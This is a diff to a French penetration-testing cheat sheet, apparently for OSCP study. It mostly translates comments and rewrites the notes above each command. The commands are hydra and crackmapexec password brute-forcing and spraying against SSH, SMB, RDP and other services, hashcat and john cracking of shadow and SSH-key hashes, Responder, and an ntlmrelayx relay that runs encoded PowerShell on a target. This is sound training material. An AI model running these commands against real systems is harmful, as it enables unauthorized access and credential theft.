@@ -11,7 +11,7 @@ Analyser les mécanismes d'authentification et les formats de hachage.
 ## Essais de mots de passe
 
 
-<p class="oscp-command-note">Vérifier des identifiants sur un service autorisé.</p>
+<p class="oscp-command-note">Hydra : tester des identifiants autorisés sur SSH à partir d'un dictionnaire.</p>
 
 ```bash
 # Essais de mots de passe sur SSH
@@ -23,28 +23,28 @@ hydra -l <username> -P <wordlist> ftp://<target_ip>
 # Essais de mots de passe sur SMB
 hydra -L <user_list> -P <password_list> smb://<target_ip>
 
-# Telnet Brute Force
+# Tester les mots de passe Telnet
 hydra -l <username> -P <wordlist> telnet://<target_ip>
 
-# MySQL Brute Force
+# Tester les mots de passe MySQL
 hydra -l <username> -P <wordlist> mysql://<target_ip>
 
-# PostgreSQL Brute Force
+# Tester les mots de passe PostgreSQL
 hydra -l <username> -P <wordlist> postgres://<target_ip>
 
-# VNC Brute Force
+# Tester les mots de passe VNC
 hydra -P <password_list> vnc://<target_ip>
 
 # HTTP Basic Authentication Brute Force
 hydra -l <username> -P <wordlist> <target_ip> http-get /
 
-# SMTP Brute Force
+# Tester les mots de passe SMTP
 hydra -l <username> -P <wordlist> smtp://<target_ip>
 
-# SNMP Brute Force
+# Tester les communautés SNMP
 hydra -P <wordlist> snmp://<target_ip>
 
-# Redis Brute Force
+# Tester les mots de passe Redis
 hydra -P <password_list> redis://<target_ip>
 
 ```
@@ -55,10 +55,10 @@ hydra -P <password_list> redis://<target_ip>
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
-<p class="oscp-command-note">Vérifier des identifiants sur un service autorisé.</p>
+<p class="oscp-command-note">Hydra : tester des identifiants autorisés sur RDP.</p>
 
 ```bash
-# Spraying passwords for RDP, one wordlist could be: /usr/share/wordlists/dirb/others/names.txt
+# Pulvérisation RDP : exemple de liste de noms de comptes :
 hydra -L <user_list> -p "<password>" rdp://<target_ip>
 
 ```
@@ -67,29 +67,29 @@ hydra -L <user_list> -p "<password>" rdp://<target_ip>
 <p class="oscp-command-note">Tester une authentification par hash NTLM sur WINRM avec CrackMapExec.</p>
 
 ```bash
-# WinRM password spraying
+# Pulvérisation de mots de passe WinRM
 crackmapexec winrm <target_ip> -u <user_list> -H <hash_list>
 
-# FTP password spraying
+# Pulvérisation de mots de passe FTP
 crackmapexec ftp <target_ip> -u <user_list> -p <password_list> -d <domain> --continue-on-success
 
-# SMB password spraying
+# Pulvérisation de mots de passe SMB
 crackmapexec smb <target_ip> -u <user_list> -p <password_list> -d <domain> --continue-on-success
 
-# RDP password spraying
+# Pulvérisation de mots de passe RDP
 crackmapexec rdp <target_ip> -u <user_list> -p "<password>" --continue-on-success
 
-# SSH password spraying
+# Pulvérisation de mots de passe SSH
 crackmapexec ssh <target_ip> -u <user_list> -p <password_list> --d <domain> --continue-on-success
 
 # Multiple targets with WinRM
 crackmapexec winrm <target_ip_list> -u <user_list> -H <hash_list> -d <domain> --continue-on-success
 
-# SMTP password spraying
-crackmapexec smtp <target_ip> -u <user_list> -p <password_list> --continue-on-success
+# Pulvérisation de mots de passe SMTP
+hydra -L <user_list> -P <password_list> -t 1 <target_ip> smtp
 
-# POP3 password spraying
-crackmapexec pop3 <target_ip> -u <user_list> -p <password_list> --continue-on-success
+# Pulvérisation de mots de passe POP3
+hydra -L <user_list> -P <password_list> -t 1 <target_ip> pop3
 
 ```
 
@@ -183,7 +183,7 @@ fcrackzip -u -D -p <LISTE_MOTS> <ARCHIVE>.zip
 Examiner les entrées et les réponses de l'application web.
 
 
-<p class="oscp-command-note">Vérifier des identifiants sur un service autorisé.</p>
+<p class="oscp-command-note">Hydra : tester des identifiants autorisés sur HTTP-POST-FORM à partir d'un dictionnaire.</p>
 
 ```bash
 # HTTP POST brute-force using Hydra
@@ -224,10 +224,10 @@ Login failed. Invalid
 Examiner les entrées et les réponses de l'application web.
 
 
-<p class="oscp-command-note">Vérifier des identifiants sur un service autorisé.</p>
+<p class="oscp-command-note">Hydra : tester des identifiants autorisés sur HTTP-GET à partir d'un dictionnaire.</p>
 
 ```bash
-# HTTP GET brute-force attack using Hydra
+# Tester une authentification HTTP GET avec Hydra
 hydra -l <username> -P <wordlist> <target_ip> http-get /
 
 ```
@@ -236,7 +236,7 @@ hydra -l <username> -P <wordlist> <target_ip> http-get /
 ## Estimer le temps de cassage d’un mot de passe
 
 
-<p class="oscp-command-note">Afficher ou écrire une valeur.</p>
+<p class="oscp-command-note">Écrire le contenu précisé dans le fichier de destination.</p>
 
 ```bash
 # Calculer l'espace de touche pour une longueur de mot de passe de <length>
@@ -266,7 +266,7 @@ python3 -c "print(62**5 / 1000000000)"  # example for 1B hashes per second
 ## Modification de listes de mots (Wordlists)
 
 
-<p class="oscp-command-note">Analyser des empreintes avec Hashcat.</p>
+<p class="oscp-command-note">Tester des empreintes hors ligne avec hashcat.</p>
 
 ```bash
 # Utilisation de Hashcat avec des attaques basées sur des règles
@@ -562,10 +562,10 @@ keepass2john <COFFRE>.kdbx > <RESULTAT>.hash
 # Définir les permissions correctes pour la clé privée SSH
 chmod 600 <id_rsa>
 
-# Convert SSH key to John format
+# Convertir la clé SSH au format John
 ssh2john <id_rsa> > ssh.hash
 
-# Crack the SSH key passphrase
+# Tester la phrase secrète de la clé SSH
 john --wordlist=<password_list> --rules=<rules_file> ssh.hash
 
 ```
@@ -591,7 +591,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 `/etc/shadow`  
 
 
-<p class="oscp-command-note">Analyser des empreintes avec Hashcat.</p>
+<p class="oscp-command-note">Tester des empreintes hors ligne avec hashcat.</p>
 
 ```bash
 # 1. Identifiez le hash (peut utiliser hashes.com pour le faire), par exemple: root:$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.:19453:0:99999:7::: is a SHA-512 du fait du $6$ et utilise le mode -m 1800.
@@ -988,7 +988,7 @@ Hash NTLM: <NTLM_HASH>
 ```
 
 
-<p class="oscp-command-note">Analyser des empreintes avec Hashcat.</p>
+<p class="oscp-command-note">Tester des empreintes hors ligne avec hashcat.</p>
 
 ```bash
 # La règle est facultative
@@ -1028,7 +1028,7 @@ Hash NTLM: <NTLM_HASH>
 ```
 
 
-<p class="oscp-command-note">Exécuter une commande distante via SMB.</p>
+<p class="oscp-command-note">Impacket : ouvrir une session ou exécuter une commande distante selon les droits disponibles.</p>
 
 ```bash
 # Utilisation de smbclient
@@ -1107,7 +1107,7 @@ Access is denied.
 `5600`  
 
 
-<p class="oscp-command-note">Analyser des empreintes avec Hashcat.</p>
+<p class="oscp-command-note">Tester des empreintes hors ligne avec hashcat.</p>
 
 ```bash
 hashcat -m 5600 <hash_file> /usr/share/wordlists/rockyou.txt --force
@@ -1131,11 +1131,16 @@ hashcat (v6.2.5) starting
 <p class="oscp-inline-ref"><strong>Paramètre à remplacer :</strong> <code>&lt;target_ip&gt;</code></p>
 
 
-<p class="oscp-command-note">Commande Impacket dans la rubrique « Relaying Net-NTLMv2 ».</p>
+<p class="oscp-command-note">ntlmrelayx : exemple de lancement d'un relais NTLM suivi de sa sortie de journal.</p>
 
 ```bash
-impacket-ntlmrelayx --no-http-server -smb2support -t <target_ip> -c "powershell -enc <base64_encoded_powershell_command_to_be_executed_on_the_target_machine>"
 
+```
+
+**Exemple de sortie produit par ntlmrelayx (ne pas exécuter ces lignes) :**
+
+```text
+impacket-ntlmrelayx --no-http-server -smb2support -t <target_ip> -c "powershell -enc <base64_encoded_powershell_command_to_be_executed_on_the_target_machine>"
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 [*] Protocol Client SMB loaded..
 [*] Protocol Client IMAPS loaded..
@@ -1146,15 +1151,13 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 [*] Setting up SMB Server
 [*] Setting up WCF Server
 [*] Setting up RAW Server on port 6666
-
 [*] Servers started, waiting for connections
-
 ```
 
 
 <p class="oscp-command-note">Exemple de journaux d’un relais NTLM : sortie indicative, pas une commande.</p>
 
-```bash
+```text
 [*] SMBD-Thread-4: Received connection from <victim_ip>, attacking target smb://<target_ip>
 [*] Authenticating against smb://<target_ip> as <domain>/<username> SUCCEED
 [*] SMBD-Thread-6: Connection from <victim_ip> controlled, but there are no more targets left!
@@ -1198,7 +1201,7 @@ sudo pip3 install defaultcreds-cheat-sheet
 ```
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « Database Tool ».</p>
+<p class="oscp-command-note">Rechercher les identifiants par défaut d'un produit avec l'outil creds.</p>
 
 ```bash
 creds search [service/web_server/term]
@@ -1890,7 +1893,7 @@ responder -I eth0
 ```
 
 
-<p class="oscp-command-note">Commande Impacket dans la rubrique « NTLM Relay Attack ».</p>
+<p class="oscp-command-note">ntlmrelayx : lire une liste de cibles avec -tf et accepter le protocole SMB2.</p>
 
 ```bash
 impacket-ntlmrelayx -tf relay.txt -smb2support
@@ -1924,7 +1927,7 @@ nxc smb [target] -u [localAdmin] -p [password] -M schtask_as -o USER=[logged-on-
 Examiner les objets, les droits et les services du domaine.
 
 
-<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
+<p class="oscp-command-note">Vérifier les identifiants et droits visibles via ENVIRONNEMENT avec NetExec/CrackMapExec.</p>
 
 ```bash
 netexec [protocol] [target(s)] -u FILE -p password
@@ -1951,7 +1954,7 @@ DOMAIN2\user
 ```
 
 
-<p class="oscp-command-note">Exécuter un script Python.</p>
+<p class="oscp-command-note">Exécuter script.py avec les paramètres indiqués pour «Environnement multidomaine».</p>
 
 ```bash
 python3 script.py -u [users_list].txt -d [domains_list].txt
